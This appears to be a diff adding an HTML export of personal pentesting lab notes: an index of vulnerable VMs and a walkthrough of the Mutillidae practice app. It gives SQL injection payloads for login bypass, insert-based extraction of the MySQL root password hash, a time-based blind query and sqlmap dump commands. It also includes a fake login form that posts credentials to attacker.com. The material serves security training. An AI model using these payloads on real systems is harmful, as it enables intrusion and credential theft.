@@ -1,0 +1,67 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>mullidae</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="2019.html">2019</a></p>
+
+<ol>
+<li><a href="2019--BasicPenTestingBox.html">BasicPenTestingBox</a></li>
+<li><a href="2019--BasicPenTestingBox2.html">BasicPenTestingBox2</a></li>
+<li><a href="2019--bee_box.html">bee box</a></li>
+<li><a href="2019--BossPlayer.html">BossPlayer</a></li>
+<li><a href="2019--CyberChallenge19.html">CyberChallenge19</a></li>
+<li><a href="2019--Dawn.html">Dawn</a></li>
+<li><a href="2019--DC-1.html">DC-1</a></li>
+<li><a href="2019--DC-2.html">DC-2</a></li>
+<li><a href="2019--DC-3.html">DC-3</a></li>
+<li><a href="2019--DerpNStik.html">DerpNStik</a></li>
+<li><a href="2019--EVM.html">EVM</a></li>
+<li><a href="2019--Fowsniff.html">Fowsniff</a></li>
+<li><a href="2019--Gemini_Inc_1.html">Gemini Inc 1</a></li>
+<li><a href="2019--JIS_CTF.html">JIS_CTF</a></li>
+<li><a href="2019--mullidae.html">mullidae</a></li>
+<li><a href="2019--PumpkinFestival.html">PumpkinFestival</a></li>
+<li><a href="2019--PumpkinGarden.html">PumpkinGarden</a></li>
+<li><a href="2019--PumpkinRaising.html">PumpkinRaising</a></li>
+<li><a href="2019--QuaoarCTFHackfest2016.html">QuaoarCTFHackfest2016</a></li>
+<li><a href="2019--Rickdiculously_Easy.html">Rickdiculously Easy</a></li>
+<li><a href="2019--silky02.html">silky02</a></li>
+<li><a href="2019--silky1.html">silky1</a></li>
+<li><a href="2019--Typhoon.html">Typhoon</a></li>
+<li><a href="2019--VMS_to_try.html">VMS to try</a></li>
+<ol>
+<li><a href="2019--VMS_to_try--US_Gov_Conf.html">US Gov Conf</a></li>
+<li><a href="2019--VMS_to_try--Gruyere.html">Gruyere</a></li>
+</ol>
+<li><a href="2019--xss_challenges.html">xss challenges</a></li>
+<li><a href="2019--Blue.html">Blue</a></li>
+<li><a href="2019--mr_robot.html">mr robot</a></li>
+<li><a href="2019--Unfinished_VMS.html">Unfinished VMS</a></li>
+<ol>
+<li><a href="2019--Unfinished_VMS--CasinoRoyale.html">CasinoRoyale</a></li>
+<li><a href="2019--Unfinished_VMS--WinterMute_Straylight.html">WinterMute Straylight</a></li>
+<li><a href="2019--Unfinished_VMS--connect_the_dots_(unfinished).html">connect the dots (unfinished)</a></li>
+<li><a href="2019--Unfinished_VMS--arsenal.html">arsenal</a></li>
+<li><a href="2019--Unfinished_VMS--heist.html">heist</a></li>
+<li><a href="2019--Unfinished_VMS--MyHouse_Box.html">MyHouse Box</a></li>
+<li><a href="2019--Unfinished_VMS--Sputnik.html">Sputnik</a></li>
+<li><a href="2019--Unfinished_VMS--Node.html">Node</a></li>
+<li><a href="2019--Unfinished_VMS--HackInOs.html">HackInOs</a></li>
+<li><a href="2019--Unfinished_VMS--Seattle.html">Seattle</a></li>
+<li><a href="2019--Unfinished_VMS--DC416-Galahad.html">DC416-Galahad</a></li>
+</ol>
+<li><a href="2019--Not_a_Box.html">Not a Box</a></li>
+<ol>
+<li><a href="2019--Not_a_Box--securitytreasurehunt_web.html">securitytreasurehunt web</a></li>
+<li><a href="2019--Not_a_Box--rpc.html">rpc</a></li>
+<li><a href="2019--Not_a_Box--msf_fix.html">msf fix</a></li>
+</ol>
+<li><a href="2019--ICE.html">ICE</a></li>
+</ol></div>
+<div class="page"><h1><b><u>mullidae</u></b></h1>Using Metasploitable Box<br /><br />- First fix the database<br /><br />var/www/Multillidae<br /><br />sudo nano config.inc<br /><br />change db name from meatsploit to owasp10<br /><br />restart apache:<br />sudo /etc/init.d/apache2 reload<br /><br />In browser:<br />Click reset DB<br /><br />A1 - Sql Injection - SQLi - Extract Data - User Info<br /><br />Exploit:<br /><br />Leave Username field empty<br />Password field enter: ' or '1'='1<br /><br />Will return all records from database<br /><br />A1 - Sql Injection - SQLi - Bypass Login<br /><br />Exploit:<br /><br />http://172.16.124.129/mutillidae/index.php?page=user-info.php&amp;username=%27or%20%271%27=%271&amp;password=%27%20or%20%271%27=%271&amp;user-info-php-submit-button=View+Account+Details<br /><br />or <br /><br />uname: x' OR '1'='1<br /><br />password: x' or '1'='1<br /><br /><br />A1 - Sql Injection - SQLi - Insert Injection<br /><br />SQL Insert Queries have the following format:<br /><br />INSERT INTO TABLE (username, password, signature) VALUES (..., ..., ...);<br /><br />So you could do:<br /><br />Username:  name', 'pass', 'sign') -- -<br /><br />Password: whatever <br /><br />Confirm Password: whatever<br /><br />Signature: Whatever<br /><br />Insert Query not Reflected in Result<br />There are other places where info is reflected:<br /><br />ie. Signature is show when logged in<br /><br />Query:<br /><br />Username: test',  'test', (select version()))-- -<br /><br />Login with uname and pword test<br /><br />To get password hash for user root:<br /><br />test1', 'test1', (select password from mysql.user where user='root' LIMIT 0,1))-- -<br /><br />And we get password hash for user root<br /><br /><br />Process<br /><br />1. Identify the injection point.<br />2. Check where the injected data is visible.<br />3. Use subquery to insert sql queries.<br />4. Use LIMIT to get one row at a time.<br /><br /><br />A1 - Injection - SQLi - Blind SQL via Timing<br /><br />- type of sql injection attack that asks the db true or false questions and determines the answer based on the applications response<br /><br />- example of blind:<br /><br />Username: ' or '1'='1<br />Password: password<br /><br />Logs in as a user with username password<br />(You could also do the opposite, pick as username and find any password)<br /><br />Time-based:<br />Relies on the database pausing for a specified amount of time, then returning the results, Indicating a successful sql query<br /><br />IE:<br /><br />If the first letter of admin password is 2 the database will take a long time to reply<br /><br />IF(SUBSTRING(password, 1, 1) = CHAR(50) , BENCHMARK(500000, ENCODE('MSG', 'by 5 seconds')), null) <br /><br /><br />A1 - Injection - SQLi - Practice SQLMAP<br /><br />View Someones Blog <br /><br />- Author is Injectable<br />- Open Wireshark or Burpsuite<br />- Capture a POST Request<br />- Save as text file<br />- Run Sqlmap<br /><br />sqlmap -r post-text.txt<br /><br />Use Sqlmap to explore the database<br /><br /><br />Get all the databases on the server:<br /><br />sqlmap -r post-text.txt --dbs<br /><br />Dump information about database of interest:<br /><br />sqlmap -r post-text.txt -D owasp10  --dump<br /><br />View your details <br />(Do the same thing with username and password)<br /><br /><br />A1 - Injection - SQLi - HTMLi <br /><br />Add New Blog Entry<br /><br />Syntax: <br /><br />INSERT INTO blogs_table(blogger_name, comment, date) VALUES ('username', 'text', now())<br /><br />Create a fake login form which sends credentials to blog entry<br /><br />&lt;h1&gt;Sorry, please login again&lt;/h1&gt;&lt;br/&gt; &lt;form method="post" action="http://attacker.com/stealing.php"&gt; Username&lt;input type="text" name="username"&gt;&lt;br/&gt; Password&lt;input type="password"name="password"&gt;&lt;br/&gt; &lt;input type="submit" value="Submit"&gt; &lt;/form&gt;<br /><br />A2 - XSS - Reflected First Order DNS Lookup<br />... <br /><br /></div></div>
+</body></html>
